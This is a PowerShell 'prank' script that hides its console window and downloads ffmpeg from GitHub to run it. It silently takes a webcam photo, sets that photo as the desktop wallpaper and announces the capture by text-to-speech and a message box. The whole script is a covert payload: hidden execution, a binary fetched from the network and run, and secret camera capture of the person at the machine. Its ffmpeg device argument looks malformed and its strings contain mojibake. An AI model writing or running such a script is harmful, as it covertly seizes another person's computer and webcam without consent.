Add-Type -AssemblyName System.Speech
Add-Type -AssemblyName Microsoft.VisualBasic

# Hide Console
Add-Type -Name Win -Namespace H -MemberDefinition '
  [DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$consolePtr = [H.Win]::GetConsoleWindow()
[H.Win]::ShowWindow($consolePtr, 0)

# Create temp directory
$TempPath = "$env:TEMP\prnkcam"
New-Item -ItemType Directory -Path $TempPath -Force | Out-Null
$FfmpegPath = "$TempPath\ffmpeg.exe"
$ImagePath = "$TempPath\you_have_been_captured.jpg"

# Download ffmpeg (static build, cam-support, ~5MB) if not exists
if (!(Test-Path $FfmpegPath)) {
    Invoke-WebRequest -Uri "https://github.com/ffbinaries/ffbinaries-prebuilt/releases/download/v4.4.1/ffmpeg-win64.zip" -OutFile "$TempPath\ffmpeg.zip" -UseBasicParsing
    Expand-Archive -Path "$TempPath\ffmpeg.zip" -DestinationPath $TempPath -Force
    Move-Item -Path "$TempPath\ffmpeg.exe" -Destination $FfmpegPath -Force
    Remove-Item "$TempPath\ffmpeg.zip" -Force
}

# Take photo from default camera
Start-Process -FilePath $FfmpegPath -ArgumentList "-f dshow -i video=`"video=Integrated Camera`" -vframes 1 `"$ImagePath`"" -Wait -NoNewWindow

# Set the captured image as wallpaper
Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
  [DllImport("user32.dll", SetLastError=true)]
  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $ImagePath, 3)

# TTS Message
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speak.Rate = -1
$speak.Volume = 100
$speak.Speak("Smile. Youâ€™ve been captured.")
Start-Sleep -Milliseconds 700
$speak.Speak("You are now part of the wallpaper.")

# Messagebox
[Microsoft.VisualBasic.Interaction]::MsgBox("This was a prank. No data was sent. Check your desktop ðŸ˜ˆ", "OKOnly,Info", "Prank Complete")
